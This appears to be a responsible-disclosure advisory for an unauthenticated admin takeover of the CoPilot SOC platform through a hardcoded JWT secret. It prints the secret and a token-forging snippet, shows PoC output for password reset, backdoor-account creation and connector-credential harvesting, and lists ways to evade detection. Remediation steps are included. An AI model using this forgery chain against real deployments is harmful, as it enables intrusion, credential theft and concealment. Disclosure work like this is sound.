




# CVE-PENDING — CoPilot: Unauthenticated Full Admin Compromise via Hardcoded JWT Secret

> **Disclosure type:** Responsible disclosure  
> **Severity:** Critical (CVSS 3.1: 10.0)  
> **Status:** Unpatched — reported to maintainers  
> **Affected software:** [CoPilot](https://github.com/socfortress/CoPilot) — SOC platform by SOCFortress  
> **Affected versions:** All versions where `JWT_SECRET` is unset (including the default Docker Compose setup)

---

## Summary

CoPilot ships a hardcoded JWT secret as a fallback value in `backend/app/auth/utils.py` and verbatim in `.env.example`. Any deployment where `JWT_SECRET` is not explicitly overridden — including the default Docker Compose setup — signs all authentication tokens with this publicly known value.

An unauthenticated attacker who knows this secret (it is indexed on GitHub) can forge arbitrary admin-scoped JWTs and gain full control of the application and every security tool it manages without any credentials.

This is not a theoretical weakness. The attack chain below was confirmed live against a default deployment.

---

## Vulnerability Details

**File:** `backend/app/auth/utils.py`, line 28

```python
# Vulnerable code
secret = os.environ.get("JWT_SECRET", "bL4unrkoxtFs1MT6A7Ns2yMLkduyuqrkTxDV9CjlbNc=")
```

The fallback secret is a known value, present in the public repository and `.env.example`. Because the `admin` account is always seeded automatically on first startup (`app/auth/services/universal.py`), an attacker needs no prior knowledge of the target beyond the public secret to forge a fully valid admin token.

The backend performs exactly two checks on incoming JWTs:
1. Valid signature
2. `sub` claim must exist in the database

Both conditions are trivially satisfied with the public secret and the always-present `admin` user.

---

## CVSS 3.1 Score

| Metric | Value |
|---|---|
| Attack Vector | Network |
| Attack Complexity | Low |
| Privileges Required | None |
| User Interaction | None |
| Scope | **Changed** |
| Confidentiality | High |
| Integrity | High |
| Availability | High |
| **Base Score** | **10.0 Critical** |

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

Scope is **Changed** because exploitation does not stop at CoPilot — it pivots directly into every integrated security tool (Wazuh, Graylog, DFIR-IRIS, Cortex, Velociraptor) via harvested connector credentials.

---

## Confirmed Attack Chain

All steps below were executed against a live default deployment. Each returned HTTP 200.

### Step 1 — Forge admin JWT (no credentials required)

```python
import jwt, time
secret = "bL4unrkoxtFs1MT6A7Ns2yMLkduyuqrkTxDV9CjlbNc="
token = jwt.encode({"sub": "admin", "scopes": ["admin"], "exp": int(time.time()) + 86400}, secret, algorithm="HS256")
```

### Step 2 — Confirm authentication bypass

```
python 01_jwt_forgery.py dump-users

[+] Dumping user accounts (/api/auth/users) ...
  [OK] HTTP 200  user list
    2 account(s) found:
      id=1  username=admin  email=admin@admin.com  role=admin
      id=2  username=scheduler  email=scheduler@scheduler.com  role=scheduler
```

### Step 3 — Take over the admin account (password reset, no current password required)

```
python 01_jwt_forgery.py reset-password

[+] Resetting password for user 'admin' ...
  [OK] HTTP 200  password reset
    Password for 'admin' is now: Tr0ub4dor&3!!
```

`/api/auth/reset-password` accepts a forged token with no secondary verification — no current password, no email confirmation, no MFA. This is a **second independent finding** (see Finding 02 below).

### Step 4 — Plant persistent backdoor admin account

```
python 01_jwt_forgery.py add-admin
```

The backdoor account is stored in the database and survives JWT secret rotation. After rotation, the attacker re-authenticates legitimately via `/api/auth/token` using the planted credentials.

### Step 5 — Harvest connector credentials

```
python 01_jwt_forgery.py dump-connectors
```

CoPilot stores credentials for all integrated tools in plaintext in the database. These are returned directly by `/api/connectors` with an admin-scoped token. Affected integrations include Wazuh, Graylog, DFIR-IRIS, Cortex, and Velociraptor — each of which typically holds admin-level access to the tools it manages.

---

## Full Attack Chain (single command)

```
python 01_jwt_forgery.py chain
```

Executes all steps sequentially: auth bypass confirmation → credential harvest → backdoor creation → admin password reset.

---

## Findings

### Finding 01 — Hardcoded JWT secret (this issue)

**Location:** `backend/app/auth/utils.py:28`  
**Impact:** Complete authentication bypass. Forge arbitrary admin tokens with no credentials.  
**Remediation:**
```python
# Remove the default= entirely. Fail loudly on startup rather than silently use a weak secret.
secret = os.environ["JWT_SECRET"]
```
Also remove the secret from `.env.example` and replace with a placeholder. Add a startup assertion:
```python
assert len(secret) >= 32, "JWT_SECRET too short"
assert secret != "bL4unrkoxtFs1MT6A7Ns2yMLkduyuqrkTxDV9CjlbNc=", "JWT_SECRET is the insecure default"
```

### Finding 02 — No secondary verification on password reset

**Location:** `/api/auth/reset-password`  
**Impact:** Any valid admin-scoped token can reset any user's password with no ownership check. Confirmed HTTP 200 against the admin account from a forged token.  
**Remediation:** Require `current_password` for self-resets. Restrict cross-user resets to admin role with audit logging.

### Finding 03 — Connector credentials stored and returned in plaintext

**Location:** `/api/connectors` response body  
**Impact:** All integration credentials (Wazuh, DFIR-IRIS, Cortex, Velociraptor, Graylog) are readable via the API with an admin token. Combined with Finding 01, this means every tool in the SOC stack is compromised in a single request.  
**Remediation:** Encrypt credentials at rest. Never return secrets in API responses — return a masked indicator instead.

---

## Persistence & Detection Evasion

Because CoPilot manages Wazuh alerting pipelines, an attacker with admin access can:

- Whitelist their IP in Wazuh rules to suppress detection
- Modify or delete active alerts retroactively
- Abuse the `scheduler` user (also exposed) to run attacker-controlled background jobs

**The compromise is self-concealing** — the tool you would use to detect the intrusion is under attacker control.

Even after the JWT secret is rotated:
- Previously issued forged tokens remain valid until their `exp` claim
- Any backdoor account planted before rotation persists in the database
- The attacker can re-enter legitimately using planted credentials

---

## Reproduction Environment

- CoPilot default Docker Compose deployment
- `JWT_SECRET` unset (default config)
- Tested against FastAPI directly (`http://localhost:5000`) and through nginx (`https://localhost`)
- Python 3.11, pyjwt, requests

---

## Disclosure Timeline

| Date | Event |
|---|---|
| 2026-04-20 | Vulnerability discovered and confirmed |
| 2026-04-20 | PoC developed and full attack chain validated |
| 2026-04-20 | Reported to SOCFortress maintainers |

---

## Ethics

This research was conducted against a locally controlled deployment. The PoC includes an `Ethics` notice and is published solely to support remediation by the maintainers and to inform affected operators.

**Do not run this against any deployment you do not own or have explicit written authorization to test.**

---

## Files

| File | Description |
|---|---|
| `01_jwt_forgery.py` | Full PoC — forge, dump-users, dump-connectors, add-admin, reset-password, promote, chain |
| `README.md` | This document |

---

## Author

Security review conducted by Jonah DaCosta / DaCosta Consulting.
